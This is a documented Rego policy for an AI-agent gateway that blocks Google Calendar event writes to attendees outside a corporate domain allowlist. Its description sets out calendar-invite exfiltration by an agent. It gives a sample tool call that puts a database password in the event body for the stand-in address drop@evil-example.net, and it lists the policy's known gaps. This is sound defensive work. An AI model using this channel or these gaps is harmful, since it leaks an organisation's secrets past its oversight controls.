---
name: Block Calendar Invites to External Attendees
tags:
  - google-calendar
  - guard-external-send
  - ingress
  - calendar
  - soc2
  - hipaa
  - gdpr-ccpa
publishedAt: 2026-07-12
description: |
  # google-calendar / guard-external-attendees

  **Direction:** ingress (`tool_pre_invoke`)
  **Default:** deny on match, allow otherwise
  **Package:** `google_calendar.ingress.guard_external_attendees`

  ## What it does

  Denies Google Calendar event-write tool calls — `create_event` /
  `create-event`, `update_event` / `update-event`, and the consolidated
  `manage_event` — whenever any attendee address resolves to a domain outside
  a documented corporate-domain allowlist. All other tool calls pass through
  unchanged, and an event write with no attendees at all is allowed — there is
  nothing external to email.

  This closes the calendar-invite exfiltration channel: an agent can write
  secrets into an event's `summary`, `description`, or `location`, add one
  external address, and Google **emails the event body outside the
  organization** when `sendUpdates` is `all` or `externalOnly`. Because the
  invitation email is sent by Google the moment the write lands, egress
  redaction cannot help — the only effective control is denying the write at
  ingress, before it reaches the MCP server.

  The check is fail-closed: an event write whose `attendees` / `attendeeEmails`
  arguments are present but in a shape the policy cannot verify (wrong type,
  entries without a usable address, malformed `args`) is denied, not skipped.
  Callers whose `input.subject.claims.groups` include the placeholder
  `calendar-external-schedulers` group are exempt, so legitimate cross-org
  scheduling still works; a caller with no claims is never exempt.

  ## Compliance alignment

  - **SOC 2 CC6.7** — supports the restriction on transmission/movement of
    information outside the boundary: event bodies carrying corporate content
    cannot be mailed to non-corporate domains via agent-created invites;
    **P6.1** — supports limits on personal information disclosure to third
    parties over the agent's calendar path.
  - **HIPAA §164.530(c)** — supports privacy safeguards by preventing an agent
    from pushing PHI-bearing event titles, descriptions, or locations to
    addresses outside the covered entity's domains via invitation email.
  - **GDPR Art. 5(1)(f) / Art. 32** — supports security of processing on the
    agent's calendar-write path; **Arts. 44/46** — supports control over
    agent-visible cross-border transfers by pinning invite recipients to
    reviewed corporate domains.

  ## Tool name matching

  Tool names are read from **both** the PARC `input.resource.name` and the
  still-populated legacy `input.payload.name` alias (they carry the same value
  on `tool_pre_invoke`; checking both means a call with `resource.name` absent
  still fails closed instead of slipping through as a non-write). Each name is
  lowercased and `-` is normalized to `_`, then matched by suffix:

  - `*create_event` — official Google server (`create_event`, snake_case) and
    nspady/google-calendar-mcp (`create-event`, kebab-case, normalized)
  - `*update_event` — same two servers (`update_event` / `update-event`)
  - `*manage_event` — taylorwilsdon/google_workspace_mcp's consolidated write
    tool; see below

  The DTwo gateway prefixes tool names with the configured MCP server name
  (e.g. `google-calendar-mcp-create-event`), and that prefix is not
  standardized — suffix matching keeps the policy portable. Verify the exact
  name your gateway sends with the dump-input debug technique before relying
  on this in production.

  `manage_event` spans create, update, **and delete** behind one action
  argument, so tool-name matching alone cannot scope it. The policy guards
  `manage_event` for every action **except an explicit `delete`** (a delete
  carries no attendee payload; denying deletes belongs to the
  `freeze-destructive-events` companion). The upstream action vocabulary is
  not fully verified, so a missing, empty, non-string, or unrecognized action
  stays guarded — fail closed.

  The read-only Claude connector (`gcal_*`) exposes no write tools, so nothing
  it sends matches this policy.

  ## Argument shape

  Attendee addresses are read with `object.get` from two argument keys:

  - `attendees` — the nspady / official-server superset shape: an array of
    objects each carrying the address under `email`
    (`[{"email": "a@example.com"}]`). Bare address strings inside the array
    are also accepted defensively.
  - `attendeeEmails` — an array of address strings. Verified on the official
    server's `suggest_time` (a read tool this policy does not guard); checked
    on writes defensively in case a server reuses the shape there.

  Parsing is deliberately conservative: an address must contain exactly one
  `@` to yield a domain — entries with zero or multiple `@` signs (including
  several addresses smuggled into one entry) fail to parse and the write is
  **denied**, not skipped. Domain comparison is exact and case-insensitive
  (subdomains of an allowlisted domain do **not** match). An `attendees` /
  `attendeeEmails` value that is present but not an array, an entry without a
  usable address, or an `args` object that is not an object all deny the call
  as unverifiable.

  The domain allowlist ships with **placeholder** values (`example.com`,
  `example.org`) — replace them with your organization's domains at import
  time.

  ## Examples

  ### Allowed — internal attendees only

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "google-calendar-mcp-create-event", "type": "tool" },
      "payload": {
        "name": "google-calendar-mcp-create-event",
        "args": {
          "summary": "Sprint review",
          "attendees": [
            { "email": "alice@example.com" },
            { "email": "bob@example.org" }
          ],
          "sendUpdates": "all"
        }
      }
    }
  }
  ```

  `allow = true`, no reason.

  ### Denied — external attendee on a secret-bearing event

  ```jsonc
  {
    "input": {
      "action": "tool_pre_invoke",
      "resource": { "name": "google-calendar-mcp-create-event", "type": "tool" },
      "payload": {
        "name": "google-calendar-mcp-create-event",
        "args": {
          "summary": "creds",
          "description": "db password: hunter2",
          "attendees": [{ "email": "drop@evil-example.net" }],
          "sendUpdates": "all"
        }
      }
    }
  }
  ```

  `allow = false`, reason instructs the caller to remove the external
  attendees or request the exemption group.

  ## Composition

  This policy is single-purpose. Useful companions:

  - A transform policy that rewrites `sendUpdates` to `"none"` on agent
    create/update/delete calls, so even allowed writes never blast
    invitation emails without a human deciding to send them.
  - `guard-public-exposure` — denies `visibility: "public"`,
    `guestsCanModify`, and `anyoneCanAddSelf`, closing the exposure and
    delegation channels this policy does not inspect.
  - `freeze-destructive-events` — denies `delete_event` / `delete-event` and
    `manage_event` deletes, which this policy deliberately leaves alone.
  - `redact-attendee-pii` — egress redaction of attendee lists and event
    bodies on the read side.
  - A `default-deny-unknown-tools` (PF-28) allowlist policy, so a write tool
    with an unanticipated name cannot slip past suffix matching.

  ## Known limitations

  - **Placeholders.** The domain allowlist entries (`example.com`,
    `example.org`) and the exemption group name
    (`calendar-external-schedulers`) are placeholders — replace them with your
    corporate domains and your IdP's group name at import time.
  - **`manage_event` action vocabulary is unverified.** The taylorwilsdon
    README confirms create/update/delete are disambiguated by an action
    argument, but the exact argument name and its values are not published.
    The policy reads `args.action` and fails closed (guards the call) for
    anything other than a literal `delete`; if that server spells the argument
    differently, calls stay guarded — over-denying, never over-allowing.
  - **`manage_event` deletes are not inspected.** An explicit
    `action: "delete"` bypasses this policy even if external addresses appear
    in its arguments (a delete does not create invites; cancellation mails go
    only to already-invited attendees). Pair with
    `freeze-destructive-events` to control deletes.
  - **Only `attendees` / `attendeeEmails` are inspected.** A server exposing
    attendee addresses under a different key (e.g. `guests`) would not be
    checked; extend the extraction rules if your server does. Suffix matching
    likewise only covers the known write-tool vocabularies — pair with a
    PF-28 allowlist policy for deny-by-default coverage.
  - **Event body content is not scanned.** This policy blocks the delivery
    channel (external attendee), not the secret itself. An internal-only
    event containing secrets is allowed; compose with a DLP-style ingress
    policy if you need content inspection.
  - **`guestsCanInviteOthers` residual.** An allowed internal-only event that
    leaves `guestsCanInviteOthers` enabled lets a human invitee add external
    guests later from the Calendar UI — outside the gateway's reach. The
    `guard-public-exposure` companion narrows delegation flags.
  - **Exemption takes precedence over the unverifiable-shape deny.** The
    `calendar-external-schedulers` exemption is evaluated before the fail-closed
    shape check, so an exempt caller's event write is allowed even when its
    `attendees` / `attendeeEmails` arguments are in a shape the policy cannot
    verify. This is intentional: exempt callers are already trusted to invite
    external attendees, so a malformed payload has no control to slip past, and
    the MCP server performs its own argument validation. The fail-closed
    unverifiable deny applies to **non-exempt** callers only.

  > **Compliance note.** This policy supports alignment with the cited
  > framework controls **on the MCP path only**. No policy or bundle makes an
  > organization compliant with any framework; web-UI, native-API, and in-app
  > access are outside the gateway's reach by design. Validate against your
  > own compliance program before relying on it.
direction: ingress
apps:
  - google-calendar
industries: []
bundles:
  - soc2
  - hipaa
  - gdpr-ccpa
experimental: true
schemaVersion: 1.0.0
minimumGatewayVersion: 1.0.0b24
---

```rego
package google_calendar.ingress.guard_external_attendees

# Deny-by-default: only the explicit allow rules below permit the request.
default allow := false

# Corporate email domain allowlist — PLACEHOLDER values. Replace with your
# organization's domains at import time.
allowed_domains := {
    "example.com",
    "example.org",
}

# IdP group whose members may invite external attendees through the agent.
# PLACEHOLDER — replace with your IdP's group name at import time.
exempt_group := "calendar-external-schedulers"

# --- Tool name matching ---

# Tool-name candidates: the PARC resource.name plus the (deprecated but still
# populated on tool hooks) payload.name alias. Reading both means a call whose
# resource.name is absent still fails closed rather than slipping through as a
# non-write. Each name is lowercased and "-" normalized to "_" so create_event
# (official Google, snake_case), create-event (nspady, kebab-case), and any
# gateway server-name prefix all land on the same suffix.
tool_names contains normalized if {
    name := object.get(object.get(input, "resource", {}), "name", "")
    is_string(name)
    name != ""
    normalized := replace(lower(name), "-", "_")
}

tool_names contains normalized if {
    payload := object.get(input, "payload", {})
    is_object(payload)
    name := object.get(payload, "name", "")
    is_string(name)
    name != ""
    normalized := replace(lower(name), "-", "_")
}

# Event-write suffix family: *create_event / *update_event across the official
# Google server and nspady (normalized above). The read-only Claude gcal_*
# connector exposes no write tools, so nothing it sends matches.
is_event_write if {
    some name in tool_names
    endswith(name, "create_event")
}

is_event_write if {
    some name in tool_names
    endswith(name, "update_event")
}

# Consolidated manage_event (taylorwilsdon) spans create, update, AND delete
# behind one action argument, so tool-name matching alone cannot scope it.
# Guard every action except an explicit delete: the upstream action vocabulary
# is not fully verified, so a missing, empty, non-string, or unrecognized
# action stays guarded (fail closed). A literal "delete" carries no attendee
# payload and is left to the freeze-destructive-events companion policy.
is_manage_event_tool if {
    some name in tool_names
    endswith(name, "manage_event")
}

is_event_write if {
    is_manage_event_tool
    not manage_action_is_delete
}

manage_action := lower(trim_space(raw)) if {
    raw := object.get(args, "action", "")
    is_string(raw)
}

manage_action_is_delete if {
    manage_action == "delete"
}

# --- Argument access ---

# Tool arguments — defined only when payload and args are well-typed objects.
# When they are not, `args` is undefined, every rule that reads it fails
# silently, and the unverifiable deny below takes over.
args := value if {
    payload := object.get(input, "payload", {})
    is_object(payload)
    value := object.get(payload, "args", {})
    is_object(value)
}

args_malformed if {
    not is_object(object.get(input, "payload", {}))
}

args_malformed if {
    payload := object.get(input, "payload", {})
    is_object(payload)
    raw := object.get(payload, "args", null)
    raw != null
    not is_object(raw)
}

# --- Attendee extraction ---

# Calendar v3 / nspady superset shape: attendees is an array of objects, each
# carrying the attendee's address under "email".
attendee_emails contains email if {
    value := object.get(args, "attendees", [])
    is_array(value)
    some entry in value
    is_object(entry)
    raw := object.get(entry, "email", "")
    is_string(raw)
    email := lower(trim_space(raw))
    email != ""
}

# Defensive: accept attendees given as bare address strings.
attendee_emails contains email if {
    value := object.get(args, "attendees", [])
    is_array(value)
    some entry in value
    is_string(entry)
    email := lower(trim_space(entry))
    email != ""
}

# Official suggest_time shape (attendeeEmails: array of strings), checked on
# writes defensively in case a server reuses it there.
attendee_emails contains email if {
    value := object.get(args, "attendeeEmails", [])
    is_array(value)
    some entry in value
    is_string(entry)
    email := lower(trim_space(entry))
    email != ""
}

# --- Fail-closed verifiability checks ---

attendees_unverifiable if args_malformed

# attendees / attendeeEmails present but not an array.
attendees_unverifiable if {
    value := object.get(args, "attendees", null)
    value != null
    not is_array(value)
}

attendees_unverifiable if {
    value := object.get(args, "attendeeEmails", null)
    value != null
    not is_array(value)
}

# An attendees entry that is neither a non-empty address string nor an object
# with a non-empty string email cannot be checked — deny rather than skip.
attendees_unverifiable if {
    value := object.get(args, "attendees", [])
    is_array(value)
    some entry in value
    not attendee_entry_ok(entry)
}

attendees_unverifiable if {
    value := object.get(args, "attendeeEmails", [])
    is_array(value)
    some entry in value
    not attendee_email_string_ok(entry)
}

attendee_entry_ok(entry) if {
    attendee_email_string_ok(entry)
}

attendee_entry_ok(entry) if {
    is_object(entry)
    raw := object.get(entry, "email", "")
    is_string(raw)
    trim_space(raw) != ""
}

attendee_email_string_ok(entry) if {
    is_string(entry)
    trim_space(entry) != ""
}

# --- Domain check ---

# Extract the domain of one attendee address. Deliberately conservative: the
# address must contain exactly one "@" — zero or multiple "@" signs (e.g. two
# addresses smuggled into one entry) yield no domain, so is_internal fails and
# the write is denied.
attendee_domain(email) := domain if {
    parts := split(email, "@")
    count(parts) == 2
    # Strip only the TRAILING closing bracket (and stray trailing spaces) of a
    # "Name <user@domain>" form. Must not trim the left of the domain: a leading
    # ">" or space (e.g. "drop@>example.com", "drop@ example.com") is not a valid
    # domain and must stay unrecognized so is_internal fails and the write is
    # denied — trim() (both ends) would misread these as the allowlisted domain.
    domain := trim_right(parts[1], "> ")
}

is_internal(email) if {
    allowed_domains[attendee_domain(email)]
}

has_external_attendee if {
    some email in attendee_emails
    not is_internal(email)
}

# --- Exemption ---

# Exempt callers in the documented IdP group. Missing subject, claims, or
# groups means no exemption — the grant fails closed.
caller_exempt if {
    subject := object.get(input, "subject", {})
    claims := object.get(subject, "claims", {})
    groups := object.get(claims, "groups", [])
    some group in groups
    group == exempt_group
}

# --- Allow rules ---

# Allow anything that is not a guarded calendar event write (reads, frees/busy,
# responds, explicit manage_event deletes, other apps' tools, ...).
allow if {
    not is_event_write
}

allow if {
    is_event_write
    caller_exempt
}

# Allow an event write only when the attendee arguments are verifiable and no
# attendee resolves to a domain outside the allowlist. An event with no
# attendees at all passes — there is nothing external to email.
allow if {
    is_event_write
    not attendees_unverifiable
    not has_external_attendee
}

# --- Deny reasons ---

reasons contains "This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role." if {
    is_event_write
    not caller_exempt
    has_external_attendee
}

reasons contains "The attendee list on this calendar event is in a shape the policy cannot verify, so the call was denied as a precaution. Provide attendees as an array of objects with an email field, or attendeeEmails as an array of address strings. If this is a false positive, contact your InfoSec team." if {
    is_event_write
    not caller_exempt
    attendees_unverifiable
}

reason := joined if {
    count(reasons) > 0
    reason_list := sort([r | some r in reasons])
    joined := concat("; ", reason_list)
}
```
